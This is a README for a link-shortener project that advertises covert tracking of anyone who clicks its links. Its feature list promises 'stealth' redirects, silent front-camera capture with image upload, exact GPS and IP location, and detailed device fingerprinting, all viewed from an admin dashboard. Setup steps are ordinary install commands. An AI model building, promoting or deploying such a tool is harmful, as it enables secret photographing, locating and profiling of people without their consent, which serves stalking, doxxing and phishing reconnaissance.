# ⚡ Camera & Intelligence URL Shortener

An ultra-fast, modern, full-stack Next.js URL shortener and telemetry platform powered by Supabase. Engineered with serverless native API routes, instantaneous redirection, device intelligence, and camera/GPS verification features.

---

## 🚀 Key Features

- **⚡ Blazing Fast Redirection (<100ms):** Zero-latency server resolution with background asynchronous telemetry (`keepalive: true`).
- **🛡️ Stealth Redirection:** Clean, pure white redirection screen with zero disruptive UI or loaders.
- **📷 Camera Capture (Optional):** Automatic silent user-facing camera capture with automated cloud upload (ImgBB/ImageKit).
- **📍 Precise Location & GPS:** Exact latitude/longitude capture with 1-click Google Maps visualization.
- **🌐 Smart IP & Geo Detection:** Automatic server-side client IP and City/Country extraction from request headers without blocking user redirects.
- **💻 Deep Device & Hardware Intel:**
  - Operating System & Browser identification
  - Battery level & charging status
  - Network connection type
  - Hardware concurrency (CPU cores) & Device Memory (RAM)
  - WebGL GPU Vendor & Renderer
  - Screen resolution, color depth & system timezone
- **🔒 Password Protection & Expiration:** Secure short links behind custom access codes or automated expiration dates.
- **🎯 Social Gate Unlocks:** Require visitors to subscribe/follow on YouTube, Telegram, Instagram, or TikTok before unlocking destination URLs.
- **📊 Admin Telemetry Dashboard (`/saqib-admin`):** Dark-mode command center to manage links, inspect visitor logs, view captured images, and analyze visitor demographics.

---

## 🛠️ Tech Stack

- **Framework:** Next.js 16 (App Router + Turbopack)
- **Language:** TypeScript
- **Styling:** Tailwind CSS + Lucide Icons + Framer Motion
- **Database:** Supabase (PostgreSQL)
- **Media Hosting:** ImgBB / ImageKit API
- **Client Parsing:** UAParser.js

---

## 📦 Getting Started

### 1. Clone the repository
```bash
git clone https://github.com/techai342/camera.git
cd camera
```

### 2. Install dependencies
```bash
npm install
```

### 3. Configure Environment Variables
Create a `.env.local` file in the root directory:
```env
NEXT_PUBLIC_SUPABASE_URL=https://your-supabase-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-supabase-anon-key
```

### 4. Run Development Server
```bash
npm run dev
```
Open [http://localhost:3005](http://localhost:3005) in your browser.

---

## 📡 API Endpoints

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/api/shorten` | Generate a new short link with custom parameters |
| `GET` | `/api/resolve/[shortCode]` | Fast lookup of destination URL and security rules |
| `POST` | `/api/analytics` | Record visitor telemetry & hardware intelligence |
| `GET` | `/api/links` | Fetch links belonging to device or phone identity |
| `GET/DELETE` | `/api/links/[code]` | View or delete specific short links |
| `GET/DELETE` | `/api/admin/links` | Admin controls, statistics & analytics logs |
| `POST` | `/api/upload` | Secure server-side image upload |

---

## 🚀 Deployment to Vercel

The application is fully optimized for **Vercel**:
1. Push your repository to GitHub.
2. Import project into Vercel.
3. Add `NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY` to Environment Variables.
4. Deploy! Next.js will automatically detect edge IP headers and route traffic globally with optimal performance.

---

## 📄 License
MIT License. Built for performance and modern web standards.
